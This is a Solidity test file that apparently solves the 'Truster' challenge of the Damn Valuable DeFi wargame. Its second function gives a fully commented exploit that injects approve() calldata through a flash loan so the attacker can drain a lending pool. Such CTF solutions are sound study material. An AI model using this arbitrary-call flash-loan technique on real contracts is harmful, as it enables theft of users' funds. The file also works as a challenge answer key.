// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../../src/Contracts/truster/TrusterLenderPool.sol";
import {ExploitContract} from "../../../src/Contracts/truster/ExploitContract.sol";

contract Truster is Test {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;

    Utilities internal utils;
    TrusterLenderPool internal trusterLenderPool;
    DamnValuableToken internal dvt;
    ExploitContract internal exploiter;
    address payable internal attacker;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        trusterLenderPool = new TrusterLenderPool(address(dvt));
        vm.label(address(trusterLenderPool), "Truster Lender Pool");

        dvt.transfer(address(trusterLenderPool), TOKENS_IN_POOL);

        assertEq(dvt.balanceOf(address(trusterLenderPool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */

        exploiter = new ExploitContract(address(dvt), address(trusterLenderPool));

        console.log("Balance of attacker before attack : ", dvt.balanceOf(address(attacker)));
        console.log("Balance of pool before attack : ", dvt.balanceOf(address(trusterLenderPool)));
        vm.startPrank(attacker);
        exploiter.attackContract(); // Calling the exploit contract
        vm.stopPrank();
        console.log("Balance of attacker after attack : ", dvt.balanceOf(address(attacker)));
        console.log("Balance of pool after attack : ", dvt.balanceOf(address(trusterLenderPool)));

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    // another version without creating a contract
    function testExploit2() public {
        /**
         * EXPLOIT START *
         */

        uint256 poolBalance = dvt.balanceOf(address(trusterLenderPool));
        console.log("Balance of pool before attack : ", poolBalance);
        console.log("Balance of attacker before attack : ", dvt.balanceOf(address(attacker)));

        bytes memory attackData = abi.encodeWithSignature("approve(address,uint256)", attacker, poolBalance); // creating data with signature to approve the attacker to spend on behalf of the pool.

        vm.startPrank(attacker);
        trusterLenderPool.flashLoan(0, attacker, address(dvt), attackData); // calling flashloan with 0 tokens, sending attackData which will go into functionCall in the pool contract.
        dvt.transferFrom(address(trusterLenderPool), attacker, poolBalance); // transferring since attacker now has approval on behalf of pool.
        vm.stopPrank();

        console.log("Balance of attacker after attack : ", dvt.balanceOf(address(attacker)));
        console.log("Balance of pool after attack : ", dvt.balanceOf(address(trusterLenderPool)));

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvt.balanceOf(address(trusterLenderPool)), 0);
        assertEq(dvt.balanceOf(address(attacker)), TOKENS_IN_POOL);
    }
}
